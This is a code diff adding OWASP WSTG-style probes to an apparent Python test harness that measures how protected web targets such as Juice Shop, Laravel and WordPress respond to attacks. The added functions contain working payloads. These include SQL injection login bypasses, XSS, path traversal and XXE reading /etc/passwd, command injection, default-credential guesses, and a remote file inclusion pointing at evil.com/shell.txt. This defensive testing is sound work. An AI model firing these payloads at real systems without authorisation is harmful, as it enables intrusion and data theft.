@@ -364,6 +364,107 @@ def attack_owasp_top10(base_url: str) -> List[RequestResult]:
     return [request_once(m, f"{base_url}{p}", headers=h, body=b) for (m, p, h, b) in reqs]
 
 
+def attack_wstg_conf_05(base_url: str) -> List[RequestResult]:
+    paths = ["/admin", "/administrator", "/manager", "/wp-admin", "/admin.php"]
+    return [request_once("GET", f"{base_url}{p}") for p in paths]
+
+
+def attack_wstg_conf_06(base_url: str) -> List[RequestResult]:
+    methods = ["TRACE", "TRACK", "DEBUG"]
+    return [request_once(m, f"{base_url}/") for m in methods]
+
+
+def attack_wstg_athn_02(base_url: str) -> List[RequestResult]:
+    creds = [
+        {"email": "admin@juice-sh.op", "password": "admin"},
+        {"email": "root@juice-sh.op", "password": "root"},
+    ]
+    return [request_once("POST", f"{base_url}/rest/user/login", headers={"content-type": "application/json"}, body=c) for c in creds]
+
+
+def attack_wstg_athn_04(base_url: str) -> List[RequestResult]:
+    creds = [
+        {"email": "admin@juice-sh.op' OR 1=1--", "password": "x"},
+        {"email": "admin@juice-sh.op'--", "password": "x"},
+    ]
+    return [request_once("POST", f"{base_url}/rest/user/login", headers={"content-type": "application/json"}, body=c) for c in creds]
+
+
+def attack_wstg_athz_01(base_url: str) -> List[RequestResult]:
+    paths = [
+        "/rest/products/search?q=../../../../etc/passwd",
+        "/public/images/../../../../etc/passwd",
+        "/?file=../../../../etc/passwd",
+    ]
+    return [request_once("GET", f"{base_url}{p}") for p in paths]
+
+
+def attack_wstg_inpv_01_02(base_url: str) -> List[RequestResult]:
+    paths = [
+        "/rest/products/search?q=<script>alert(1)</script>",
+        "/rest/products/search?q=<img src=x onerror=alert(1)>",
+        "/?name=<svg/onload=alert(1)>",
+    ]
+    return [request_once("GET", f"{base_url}{p}") for p in paths]
+
+
+def attack_wstg_inpv_05(base_url: str) -> List[RequestResult]:
+    paths = [
+        "/rest/products/search?q=' OR 1=1--",
+        "/rest/products/search?q=' UNION SELECT null, null, null--",
+        "/rest/products/search?q=1; WAITFOR DELAY '0:0:5'",
+    ]
+    return [request_once("GET", f"{base_url}{p}") for p in paths]
+
+
+def attack_wstg_inpv_11(base_url: str) -> List[RequestResult]:
+    paths = [
+        "/?file=php://filter/read=convert.base64-encode/resource=index.php",
+        "/rest/products/1/reviews?id=php://input",
+        "/?file=http://evil.com/shell.txt",
+    ]
+    return [request_once("GET", f"{base_url}{p}") for p in paths]
+
+
+def attack_wstg_inpv_12(base_url: str) -> List[RequestResult]:
+    paths = [
+        "/?cmd=;cat /etc/passwd",
+        "/?exec=|id",
+        "/?search=`whoami`",
+    ]
+    return [request_once("GET", f"{base_url}{p}") for p in paths]
+
+
+def attack_wstg_errh_01(base_url: str) -> List[RequestResult]:
+    return [
+        request_once("POST", f"{base_url}/rest/user/login", headers={"content-type": "application/json"}, body='{"email": "test@test.com", "password": }'),
+        request_once("GET", f"{base_url}/api/Products/%27"),
+    ]
+
+
+def attack_wstg_idnt_04(base_url: str) -> List[RequestResult]:
+    creds = [
+        {"email": "valid_user_but_bad_pass@juice-sh.op", "password": "x"},
+        {"email": "does_not_exist_at_all@juice-sh.op", "password": "x"}
+    ]
+    return [request_once("POST", f"{base_url}/rest/user/login", headers={"content-type": "application/json"}, body=c) for c in creds]
+
+
+def attack_wstg_inpv_04(base_url: str) -> List[RequestResult]:
+    return [
+        request_once("GET", f"{base_url}/rest/products/search?q=apple&q=banana"),
+        request_once("GET", f"{base_url}/api/Products?id=1&id=2"),
+    ]
+
+
+def attack_wstg_inpv_07(base_url: str) -> List[RequestResult]:
+    xxe_payload = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
+    return [
+        request_once("POST", f"{base_url}/b2b/v2/orders", headers={"content-type": "application/xml"}, body=xxe_payload),
+        request_once("POST", f"{base_url}/rest/user/login", headers={"content-type": "application/xml"}, body=xxe_payload),
+    ]
+
+
 def attack_long_path(base_url: str) -> List[RequestResult]:
     long_path = "/" + ("a" * 2047)
     return [request_once("GET", f"{base_url}{long_path}")]
@@ -460,7 +561,33 @@ def run_attacks_suite(base_url: str, target_name: str, output_file: Path, header
 
 
 def build_attack_tests_for_target(target_name: str) -> List[Tuple[str, Callable[[str], List[RequestResult]]]]:
-    _ = target_name
+    if target_name in {"protected_laravel", "protected_symfony", "protected_wordpress"}:
+        return [
+            ("php_path_probe", attack_php_path_probe),
+            ("php_lfi_probe", attack_php_lfi_probe),
+            ("php_sqli_probe", attack_php_sqli_probe),
+            ("php_rce_probe", attack_php_rce_probe),
+            ("php_burst", attack_php_burst),
+            ("header_probe", attack_header_probe),
+            ("header_variations", attack_header_variations),
+            ("query_injection", attack_query_injection),
+            ("long_path", attack_long_path),
+            ("method_probe", attack_method_probe),
+            ("wstg_conf_05", attack_wstg_conf_05),
+            ("wstg_conf_06", attack_wstg_conf_06),
+            ("wstg_athn_02", attack_wstg_athn_02),
+            ("wstg_athn_04", attack_wstg_athn_04),
+            ("wstg_athz_01", attack_wstg_athz_01),
+            ("wstg_inpv_01_02", attack_wstg_inpv_01_02),
+            ("wstg_inpv_05", attack_wstg_inpv_05),
+            ("wstg_inpv_11", attack_wstg_inpv_11),
+            ("wstg_inpv_12", attack_wstg_inpv_12),
+            ("wstg_errh_01", attack_wstg_errh_01),
+            ("wstg_idnt_04", attack_wstg_idnt_04),
+            ("wstg_inpv_04", attack_wstg_inpv_04),
+            ("wstg_inpv_07", attack_wstg_inpv_07),
+        ]
+
     return [
         ("brute_force", attack_brute_force),
         ("credential_stuffing", attack_credential_stuffing),
@@ -473,6 +600,19 @@ def build_attack_tests_for_target(target_name: str) -> List[Tuple[str, Callable[
         ("owasp_top10", attack_owasp_top10),
         ("long_path", attack_long_path),
         ("method_probe", attack_method_probe),
+        ("wstg_conf_05", attack_wstg_conf_05),
+        ("wstg_conf_06", attack_wstg_conf_06),
+        ("wstg_athn_02", attack_wstg_athn_02),
+        ("wstg_athn_04", attack_wstg_athn_04),
+        ("wstg_athz_01", attack_wstg_athz_01),
+        ("wstg_inpv_01_02", attack_wstg_inpv_01_02),
+        ("wstg_inpv_05", attack_wstg_inpv_05),
+        ("wstg_inpv_11", attack_wstg_inpv_11),
+        ("wstg_inpv_12", attack_wstg_inpv_12),
+        ("wstg_errh_01", attack_wstg_errh_01),
+        ("wstg_idnt_04", attack_wstg_idnt_04),
+        ("wstg_inpv_04", attack_wstg_inpv_04),
+        ("wstg_inpv_07", attack_wstg_inpv_07),
     ]
 
 
@@ -528,11 +668,16 @@ def run_default_comparison() -> None:
 
         attacks_output = _build_output_path(f"{target['name']}_attacks", run_id)
         print(f"\nRunning attack tests for {target['name']}...")
+        attack_headers: DefaultHeaders
+        if is_php_target:
+            attack_headers = make_header_generator({"x-forwarded-for": target["attackIp"]}, None)
+        else:
+            attack_headers = make_header_generator({"x-forwarded-for": target["attackIp"]}, target["attackIpGenerator"])
         attacks_report = run_attacks_suite(
             target["url"],
             target["name"],
             attacks_output,
-            make_header_generator({"x-forwarded-for": target["attackIp"]}, target["attackIpGenerator"]),
+            attack_headers,
         )
         all_reports["attacks"].append(attacks_report)
 
@@ -572,7 +717,10 @@ def main() -> None:
             run_normal_traffic_only(args.base_url, args.target_name, output_file, make_header_generator({"x-forwarded-for": normal_ip}, normal_ip_gen))
         return
     if args.mode == "attacks":
-        run_attacks_suite(args.base_url, args.target_name, output_file, make_header_generator({"x-forwarded-for": attack_ip}, attack_ip_gen))
+        if is_php_target:
+            run_attacks_suite(args.base_url, args.target_name, output_file, make_header_generator({"x-forwarded-for": attack_ip}, None))
+        else:
+            run_attacks_suite(args.base_url, args.target_name, output_file, make_header_generator({"x-forwarded-for": attack_ip}, attack_ip_gen))
         return
 
     tests = [("normal_traffic", attack_normal_traffic)] + build_attack_tests_for_target(args.target_name)
